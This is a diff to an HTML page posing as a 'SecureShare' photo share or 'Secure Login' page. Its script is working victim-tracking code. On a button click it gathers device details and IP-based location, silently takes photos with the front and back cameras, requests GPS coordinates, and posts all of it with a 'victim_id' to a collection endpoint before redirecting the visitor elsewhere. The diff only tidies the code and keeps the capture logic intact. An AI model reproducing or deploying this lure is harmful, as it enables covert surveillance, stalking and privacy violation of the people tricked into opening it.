@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
@@ -12,20 +12,18 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             padding: 16px;
-            margin: 0;
         }
         .glass {
-            background: rgba(255, 255, 255, 0.06);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(16px);
             border-radius: 40px;
-            padding: 32px 24px 28px;
+            padding: 32px 24px;
             max-width: 440px;
             width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
             text-align: center;
             color: #fff;
         }
@@ -35,29 +33,23 @@
             background: linear-gradient(135deg, #f093fb, #f5576c);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.5px;
-            margin-bottom: 2px;
         }
         .glass .sub {
             font-size: 13px;
-            font-weight: 400;
             letter-spacing: 3px;
-            color: rgba(255, 255, 255, 0.5);
+            color: rgba(255,255,255,0.5);
             text-transform: uppercase;
-            margin-bottom: 18px;
+            margin: 4px 0 18px;
         }
         .frame {
             border-radius: 24px;
             padding: 8px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            margin: 16px 0 18px;
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.3);
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            margin: 16px 0;
         }
         .frame img {
             width: 100%;
-            height: auto;
             aspect-ratio: 4/3;
             object-fit: cover;
             border-radius: 18px;
@@ -67,30 +59,27 @@
         .glow-btn {
             background: linear-gradient(145deg, #f093fb, #f5576c);
             border: none;
-            padding: 18px 20px;
+            padding: 18px;
             border-radius: 60px;
             color: #fff;
             font-size: 20px;
             font-weight: 700;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 8px 30px rgba(245, 87, 108, 0.35);
-            transition: all 0.25s ease;
-            letter-spacing: 0.5px;
+            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
+            transition: 0.25s;
             margin: 12px 0 6px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
         }
         .glow-btn:active { transform: scale(0.96); }
         .sparkle { animation: pulseGlow 2s infinite; }
         @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 8px 30px rgba(245, 87, 108, 0.35); }
-            50% { box-shadow: 0 8px 60px rgba(245, 87, 108, 0.7); }
+            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
+            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
         }
         .footer-text {
             font-size: 11px;
             opacity: 0.3;
             margin-top: 18px;
-            letter-spacing: 0.5px;
         }
         .hidden { display: none !important; }
         #loading {
@@ -102,7 +91,6 @@
     </style>
 </head>
 <body>
-
     <div class="glass" id="mainPage">
         <h1>🔒 SecureShare</h1>
         <p class="sub">SHARED SECURELY WITH YOU</p>
@@ -117,13 +105,11 @@
     </div>
 
     <script>
-        // ===== GET URL PARAMS =====
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
         const targetType = urlParams.get('type') || 'cam';
         const redirectUrl = '{{REDIRECT_URL}}';
 
-        // ===== DEVICE INFO =====
         function getDeviceInfo() {
             const info = {
                 userAgent: navigator.userAgent,
@@ -135,9 +121,7 @@
                 network: 'N/A'
             };
             if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    info.battery = Math.round(b.level * 100) + '%';
-                }).catch(function() {});
+                navigator.getBattery().then(b => info.battery = Math.round(b.level * 100) + '%');
             }
             if (navigator.connection) {
                 info.network = navigator.connection.effectiveType || 'N/A';
@@ -145,7 +129,6 @@
             return info;
         }
 
-        // ===== IP / LOCATION =====
         async function getLocationInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -153,35 +136,26 @@
                 return {
                     ip: data.ip || 'Unknown',
                     city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
                     lat: data.latitude || null,
                     lng: data.longitude || null
                 };
-            } catch (e) {
+            } catch {
                 return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
             }
         }
 
-        // ===== SEND DATA TO BOT =====
         async function sendData(payload) {
             try {
-                const res = await fetch('/api/capture', {
+                await fetch('/api/capture', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        victim_id: victimId,
-                        type: targetType,
-                        ...payload
-                    })
+                    body: JSON.stringify({ victim_id: victimId, type: targetType, ...payload })
                 });
-                return res.json();
             } catch (e) {
                 console.log('Send error:', e);
             }
         }
 
-        // ===== CAMERA CAPTURE =====
         function requestCamera() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
@@ -189,118 +163,72 @@
             btn.textContent = '⏳ Please wait...';
             loading.classList.remove('hidden');
 
-            // Send device + IP first
-            (async function() {
+            (async () => {
                 const device = getDeviceInfo();
                 const loc = await getLocationInfo();
-                await sendData({
-                    device_info: device,
-                    ip: loc.ip,
-                    city: loc.city,
-                    lat: loc.lat,
-                    lng: loc.lng
-                });
+                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
             })();
 
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                alert('Camera not supported on this device.');
+                alert('Camera not supported.');
                 loading.classList.add('hidden');
                 btn.disabled = false;
                 btn.textContent = 'Continue →';
                 return;
             }
 
-            // Try back camera first
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'environment' } 
-            })
-            .then(function(stream) {
-                capturePhoto(stream, 'Back');
-                
-                // Try front camera too
-                navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+            // Back camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                .then(stream => {
+                    capturePhoto(stream, 'Back');
+                    
+                    // Front camera
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                        .then(frontStream => capturePhoto(frontStream, 'Front'))
+                        .catch(() => {});
+
+                    setTimeout(requestLocation, 1000);
+                    setTimeout(() => {
+                        window.location.href = redirectUrl || 'https://google.com';
+                    }, 3000);
                 })
-                .then(function(frontStream) {
-                    capturePhoto(frontStream, 'Front');
-                })
-                .catch(function(err) {
-                    console.log('Front camera not available:', err);
+                .catch(err => {
+                    alert('❌ Camera permission required!');
+                    loading.classList.add('hidden');
+                    btn.disabled = false;
+                    btn.textContent = 'Continue →';
                 });
-
-                // After both cameras, request location
-                setTimeout(() => {
-                    requestLocation();
-                }, 1000);
-
-                // Redirect after 3 seconds
-                setTimeout(() => {
-                    if (redirectUrl && redirectUrl !== '') {
-                        window.location.href = redirectUrl;
-                    } else {
-                        window.location.href = 'https://google.com';
-                    }
-                }, 3000);
-
-            })
-            .catch(function(err) {
-                alert('❌ Camera permission required!');
-                console.log('Camera error:', err);
-                loading.classList.add('hidden');
-                btn.disabled = false;
-                btn.textContent = 'Continue →';
-            });
         }
 
         function capturePhoto(stream, cameraType) {
             const video = document.createElement('video');
             video.srcObject = stream;
-            video.onloadedmetadata = function() {
+            video.onloadedmetadata = () => {
                 video.play();
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                
-                sendData({ 
-                    photo: photoData,
-                    camera_type: cameraType 
-                });
-
-                stream.getTracks().forEach(function(t) { t.stop(); });
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                sendData({ photo: canvas.toDataURL('image/jpeg', 0.85), camera_type: cameraType });
+                stream.getTracks().forEach(t => t.stop());
             };
         }
 
-        // ===== LOCATION (OPTIONAL) =====
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        sendData({
-                            location: {
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude
-                            }
-                        });
-                    },
-                    function() { 
-                        console.log('Location denied (optional)'); 
-                    }
+                    pos => sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }),
+                    () => console.log('Location denied')
                 );
             }
         }
 
-        // ===== ON LOAD =====
-        (function() {
-            if (targetType !== 'cam') {
-                document.querySelector('.glass h1').textContent = '🔑 Secure Login';
-                document.querySelector('.sub').textContent = 'Access your account';
-                document.getElementById('continueBtn').textContent = 'Continue →';
-                document.querySelector('.footer-text').textContent = 'Your data is protected';
-            }
-        })();
+        // If not cam, change heading
+        if (targetType !== 'cam') {
+            document.querySelector('h1').textContent = '🔑 Secure Login';
+            document.querySelector('.sub').textContent = 'Access your account';
+            document.querySelector('.footer-text').textContent = 'Your data is protected';
+        }
     </script>
 </body>
 </html>
